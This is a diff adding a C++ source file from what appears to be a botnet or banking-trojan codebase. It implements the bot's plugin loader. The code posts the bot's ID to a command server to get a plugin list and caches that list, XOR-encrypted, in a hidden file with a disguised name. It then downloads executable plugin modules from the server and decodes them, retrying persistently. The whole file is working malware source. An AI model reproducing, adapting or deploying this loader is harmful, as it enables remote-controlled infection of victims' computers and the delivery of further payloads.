@@ -1,0 +1,542 @@
+//---------------------------------------------------------------------------
+
+#include <shlobj.h>
+
+#include "BotCore.h"
+#include "BotHTTP.h"
+#include "Plugins.h"
+
+//---------------------------------------------------------------------------
+
+
+// Создаём средства для вывода отладочной инфлормации
+
+//#include "BotDebug.h"
+
+namespace PLGDEBUGTEMPLATES
+{
+    #include "DbgTemplates.h"
+}
+#define PDBG  PLGDEBUGTEMPLATES::DBGOutMessage<>
+
+
+//---------------------------------------------------------------------------
+
+// Методы для загрузки и хранения кэша плагинов
+namespace PLGLoader
+{
+
+	// Пароль шифрования файла. Шифрование используется простейшее и
+	// преследует цель скрыть содержимое файла от простого обывателя
+    const static char PluginListPassword[] = {'G', 'D', 'l', 'e', 't', '6', '4', 'E',  0};
+
+    // Сигнатура файла спичка
+	#define PLUGINS_LIST_FILE_SIGNATURE 0xF3C5A945
+
+	// Версия файла списка плагинов
+	#define PLUGINS_LIST_FILE_VERSION 1
+
+	//-------------------------------------------------------------------------
+
+	// Заголовок файла плагинов
+	#pragma pack(push, 1)
+	typedef struct TFileHeader
+	{
+		DWORD Signature;   // Сигнатура файда
+		DWORD Version;     // Версия файла
+		DWORD UpdateTime;  // Время последнего обновления (в тиках)
+        DWORD HostHash;    // Хэш хоста для которого обновляли список
+        DWORD DataSize;    // Размер данных
+	} *PFileHeader;
+	#pragma pack(pop)
+
+	//-------------------------------------------------------------------------
+
+	PCHAR GetFileName()
+	{
+		// Функция возвращает имя файла кеша плагинов
+		const static char PluginsListFileName[] = {'w', 'n', 'd', 's', 'k', 's', 'i', '.', 'i', 'n', 'f',  0};
+
+		return BOT::GetWorkPath(NULL, (PCHAR)PluginsListFileName);
+	}
+
+	//-------------------------------------------------------------------------
+	bool NeedUpdateFile(PCHAR FileName, PCHAR Host)
+	{
+		// Функция вернёт истину если необходимо перегрузить
+		// список плагинов
+
+		// Открываем файл для чтения
+		HANDLE File = pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
+							OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+
+		if (File == INVALID_HANDLE_VALUE)
+		{
+			//  Возвращаем истину если файл не найден
+			return (DWORD)pGetLastError() == ERROR_FILE_NOT_FOUND;
+		}
+
+		// Читаем заголовок файла
+		TFileHeader H;
+		ClearStruct(H);
+
+		DWORD Readed;
+		pReadFile(File, &H, sizeof(H), &Readed, NULL);
+		if (Readed != sizeof(H))
+		{
+			// Ошибочный файл
+			pCloseHandle(File);
+            return true;
+		}
+
+
+		// Проверяем с этого-ли хоста была предыдущая загрузка
+		bool Result = H.HostHash != CalcHash(Host);
+
+		pCloseHandle(File);
+		return Result;
+
+    }
+
+	//-------------------------------------------------------------------------
+
+	void DoWriteBufferToFile(HANDLE File, PCHAR Buf, PCHAR Host)
+	{
+		// Функция записывает загруженный буфер в файл
+
+		DWORD Writed;
+
+		// Записываем заголовок файла
+
+		TFileHeader H;
+
+		H.Signature  = PLUGINS_LIST_FILE_SIGNATURE;
+		H.Version    = PLUGINS_LIST_FILE_VERSION;
+		H.UpdateTime = (DWORD)pGetTickCount();
+		H.HostHash   = CalcHash(Host);
+		H.DataSize   = STR::Length(Buf);
+
+		pWriteFile(File, &H, sizeof(H), &Writed, NULL);
+
+		if (H.DataSize == 0)
+			return;
+
+		// Шифруем буфер
+        XORCrypt::Crypt((PCHAR)PluginListPassword, (LPBYTE)Buf, H.DataSize);
+
+        // Записываем в файл
+		pWriteFile(File, Buf, H.DataSize, &Writed, NULL);
+	}
+    //-------------------------------------------------------------------------
+
+	bool DownloadListInFile(PCHAR FileName, PCHAR URL, PCHAR Host)
+	{
+		// Функция загружает список плагинов в файл
+		// на время загрузки файл блокируется
+
+		// Создаём файл для записи
+		HANDLE File = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,  FILE_ATTRIBUTE_HIDDEN, NULL);
+
+		if (File == INVALID_HANDLE_VALUE)
+		{
+			// В случае ошибки открытия файла для записи истину возвращаем
+			// Иистину только в случае ошибки общего доступа, что означает
+			// занятость файла другим процессом/потоком для загрузки списка
+			return pGetLastError() == ERROR_SHARING_VIOLATION;
+		}
+
+
+		// Запускаем цик загрузки списка плагинов
+        PDBG("Plugins", "Загружаем список плагинов");
+		PCHAR Buf = NULL;
+		do
+		{
+			Buf = Plugin::DownloadPluginList(URL);
+			if (Buf != NULL)
+			{
+				// Записываем буффер в файл
+				PDBG("Plugins", "Список плагинов загружен");
+                DoWriteBufferToFile(File, Buf, Host);
+			}
+			else
+				pSleep(60000);
+		}
+		while (Buf == NULL);
+				
+		// Закрываем файл
+		pCloseHandle(File);
+
+		return true;
+	}
+    //-------------------------------------------------------------------------
+
+	PCHAR ReadListFromFile(PCHAR FileName)
+	{
+		// Функция загружает список плагинов из файла
+
+		DWORD Size = 0;
+		LPBYTE Buf = File::ReadToBufferA(FileName, Size);
+		if (Buf == NULL)
+			return NULL;
+		if (Size < sizeof(TFileHeader))
+		{
+			MemFree(Buf);
+			return NULL;
+        }
+
+		// Получаем заголовок
+		PFileHeader H = (PFileHeader)Buf;
+
+		if (H->DataSize > (Size - sizeof(TFileHeader)))
+		{
+			// Файл либо битый, либо не наш
+			MemFree(Buf);
+            pDeleteFileA(FileName);
+			return NULL;
+        }
+
+		// Шифруем буфер
+		LPBYTE Temp = Buf + sizeof(TFileHeader);
+        XORCrypt::Crypt((PCHAR)PluginListPassword, Temp, H->DataSize);
+
+		PCHAR Str = STR::New((PCHAR)Temp, H->DataSize);
+		MemFree(Buf);
+
+		return Str;
+
+	}
+	//------------------------------------------------------------------------
+
+	PCHAR ExtractPluginURL(PCHAR PluginName, PCHAR Buf)
+	{
+		// Функция извлекает адрес плагина на сервере
+		if (Buf == NULL)
+			return NULL;
+
+		// Определяем позицию имени в буфере
+		int Pos = STR::Pos(Buf, PluginName, 0);
+		if (Pos < 0)
+			return NULL; // В списке нет нужного плагина
+
+		// Пропускаем разделитель |
+		PCHAR Start = Buf + Pos;
+		PCHAR End = Start;
+		while (*End != '|') End++;
+		End++;
+
+        Start = End;
+
+		// Определяем Конец строки
+		while (*End != 0 && *End != 10 && *End != 13) End++;
+
+		// Возвращаем адрес
+		return STR::New(Start, End - Start);
+
+	}
+
+}
+
+
+
+PCHAR Plugin::GetURL(PCHAR Name, PCHAR PluginsListURL, bool UpdateList)
+{
+	// Функция возвращает адрес по которому можно загрузить плагин
+	if (STR::IsEmpty(Name))
+		return NULL;
+
+	PDBG("Plugins", "Получаем имя плагина [%s]", Name);
+
+	// Получаем адрес загрузки
+	bool FreeURL = false;
+	if (STR::IsEmpty(PluginsListURL))
+	{
+		FreeURL = true;
+        PluginsListURL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
+	}
+
+	// Распарсиваем адрес списка плагинов для получения хоста
+	TURL URLRec;
+	ClearStruct(URLRec);
+
+	ParseURL(PluginsListURL, &URLRec);
+
+	// Получаем имя файла в котором хранится список плагинов
+    PCHAR FileName = PLGLoader::GetFileName();
+
+	// Этап первый. Загружаем список плагинов
+	// Загружаем в случае если UpdateList == true либо трубуемый файл
+	// отсутствует на диске
+	// На случай ошибок файловой системы зацикливаем загрузку
+	if (UpdateList || PLGLoader::NeedUpdateFile(FileName, URLRec.Host))
+	{
+		bool Completed = false;
+		do
+		{
+			if (PluginsListURL != NULL)
+				Completed = PLGLoader::DownloadListInFile(FileName, PluginsListURL, URLRec.Host);
+
+			if (!Completed)
+			{
+				pSleep(3000);
+				if (FreeURL)
+				{
+					ClearURL(&URLRec);
+					STR::Free(PluginsListURL);
+					PluginsListURL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
+                    ParseURL(PluginsListURL, &URLRec);
+                }
+			}
+
+		}
+		while (!Completed);
+	}
+
+	// Этап второй: Пытаемся прочитать файл
+	// Чтение из файла так-же зацикливаем. Делаем по причине того, что
+	// в данный момент может идти загрузка списка и функция вернёт NULL
+	PCHAR Buf = NULL;
+	do
+	{
+		Buf = PLGLoader::ReadListFromFile(FileName);
+		if (Buf == NULL)
+			pSleep(60000);
+	}
+	while (Buf == NULL);
+
+
+	//Этап третий: Собираем ссылку
+	PCHAR FullURL = NULL;
+	PCHAR URLFileName = PLGLoader::ExtractPluginURL(Name, Buf);
+	if (URLFileName != NULL)
+	{
+		FullURL = STR::New(5, ProtocolHTTP, HTTPProtocolDelimeter, URLRec.Host, "/", URLFileName );
+		STR::Free(URLFileName);
+	}
+
+	STR::Free(FileName);
+	STR::Free(Buf);
+	if (FreeURL) STR::Free(PluginsListURL);
+	ClearURL(&URLRec);
+
+    PDBG("Plugins", "Адрес плагина: [%s]", FullURL);
+
+	return FullURL;
+}
+//---------------------------------------------------------------------------
+
+
+PCHAR Plugin::DownloadPluginList(PCHAR URL)
+{
+	// Загружаем список плагинов доступных на текущем сервере
+
+	bool FreeURL = false;
+	if (URL == NULL)
+	{
+		FreeURL = true;
+		URL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
+	}
+	if (URL == NULL) return NULL;
+
+    // Отправляем ПОСТ запрос
+	PCHAR Result = NULL;
+	PCHAR BotID = GenerateBotID();
+
+	PStrings Fields = Strings::Create();
+	AddURLParam(Fields, "botuid", BotID);
+
+	THTTPResponse Response;
+    ClearStruct(Response);
+
+	#ifdef CryptHTTPH
+		PCHAR Password = GetMainPassword();
+		CryptHTTP::Post(URL, Password, Fields, &Result, &Response);
+		STR::Free(Password);
+	#else
+		HTTP::Post(URL, Fields, &Result, NULL);
+	#endif
+
+    // Орбатываем результат ответа сервера
+	if (FreeURL) STR::Free(URL);
+	STR::Free(BotID);
+	Strings::Free(Fields);
+
+	if (Response.Code != 200)
+        STR::Free2(Result);
+
+    HTTPResponse::Clear(&Response);
+
+	return Result;
+}
+//---------------------------------------------------------------------------
+
+LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileSize)
+{
+
+	//  Функция загружает файл плагина с сервера. Файл остаётся
+	//	в неизменном состоянии, т.е. не расшифровывается.
+
+	if (FileSize != NULL)
+		*FileSize = 0;
+	PDBG("Plugins", "Загружаем файл плагина [%s]", PluginName);
+
+	// Запускаем цикл загрузки плагина
+	bool UpdateList = false;
+	DWORD UpdateCount = 0; // Счётчик обновлений списка
+
+    LPBYTE Module = NULL;
+	do
+	{
+		// Получаем полный адрес плагина
+
+		PCHAR URL = GetURL(PluginName, PluginsListURL, UpdateList);
+
+		if (URL == NULL)
+		{
+			// На сервере отсутствует запрашиваемый плагин
+			PDBG("Plugins", "Плагин [%s] отсутствует на сервере", PluginName);
+			return NULL;
+		}
+
+		// В случае не первого обновления списка, перед очередной попыткой
+		// скачать файд, приостанавливаем поток
+		if (UpdateList && UpdateCount > 1)
+		{
+			DWORD Interval = 60000;
+
+			if (UpdateCount > 10)
+			{
+				if (UpdateCount <= 20)
+					Interval = Interval * 2;
+				else
+				if (UpdateCount <= 100)
+					Interval = Interval * 3;
+				else
+					Interval = Interval * 5;
+			}
+
+			pSleep(Interval);
+		}
+
+		// Загружаем документ
+
+		THTTPResponse Response;
+		ClearStruct(Response);
+
+		PCHAR Document = NULL;
+		#ifdef CryptHTTPH
+			PCHAR Pass = GetMainPassword();
+
+			bool Loaded = CryptHTTP::Get(URL, Pass, &Document, &Response);
+			STR::Free(Pass);
+		#else
+			bool Loaded = HTTP::Get(URL, &Document, &Response);
+		#endif
+
+		STR::Free(URL);
+
+		// Обрабатываем результат загрузки
+		UpdateList = false;
+
+		if (Loaded)
+		{
+			if (Response.Code == 200)
+			{
+				PDBG("Plugins", "Плагин [%s] успешно загружен", PluginName);
+				// Копируем файл
+				DWORD Size = STR::Length(Document);
+				Module = (LPBYTE)MemAlloc(Size);
+				if (Module == NULL) break;
+
+				// Копируем документ
+                m_memcpy(Module, Document, Size);
+				if (FileSize != NULL)
+					*FileSize = Size;
+			}
+			else
+			{
+				UpdateList = true;
+				UpdateCount++;
+			}
+		}
+		else
+		{
+			// В случае отсутствия интернета засыпаем на некоторое время
+			pSleep(600000);
+        }
+
+		HTTPResponse::Clear(&Response);
+	}
+	while (Module == NULL);
+
+    return Module;
+}
+//---------------------------------------------------------------------------
+
+LPBYTE Plugin::Decode(LPBYTE Buffer, DWORD BufferSize, bool IsExecutable, DWORD *NewBufferSize)
+{
+	// Функция декодирует плагин.
+	if (NewBufferSize != NULL)
+		*NewBufferSize = 0;
+
+	if (Buffer == NULL || BufferSize == 0)
+		return NULL;
+
+	// Расшифровываем XOR алгоритмом
+	const static char Signature[] = {'B', 'J', 'B', 0};
+	DWORD Size = BufferSize;
+	LPBYTE Body = XORCrypt::DecodeBuffer((PCHAR)Signature, Buffer, Size);
+
+	if (Body == NULL)
+	{
+		// Нулевой указатель означает, что модуль не был зашифрован
+		// XOR криптованием
+		Body = Buffer;
+		DWORD Size = BufferSize;
+	}
+
+	// Создаём чистый модуль
+	LPBYTE Module = NULL;
+	if (Body != NULL && Size > 0 && (!IsExecutable || IsExecutableFile(Body)))
+	{
+		Module = (LPBYTE)MemAlloc(Size);
+ 		if (Module != NULL)
+		{
+			m_memcpy(Module, Body, Size);
+			if (NewBufferSize != NULL)
+				*NewBufferSize = Size;
+        }
+	}
+
+	return Module;
+}
+
+//---------------------------------------------------------------------------
+
+LPBYTE Plugin::Download(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size, bool IsExecutable)
+{
+	// Функция загружает и дектодирует плагин
+	if (Size != NULL)
+		*Size = 0;
+
+	// 1. Загружаем файл плагина
+
+
+	DWORD BufSize = 0;
+	LPBYTE Buffer = DownloadFile(PluginName, PluginListURL, &BufSize);
+	if (Buffer == NULL)
+		return NULL;
+
+	// 2. Расшифровываем плагин
+	if (IsExecutable && IsExecutableFile(Buffer))
+	{
+		if (Size != NULL)
+			*Size = BufSize;
+		return Buffer;
+	}
+
+	LPBYTE Module = Decode(Buffer, BufSize, IsExecutable, Size);
+
+	MemFree(Buffer);
+
+	return Module;
+}
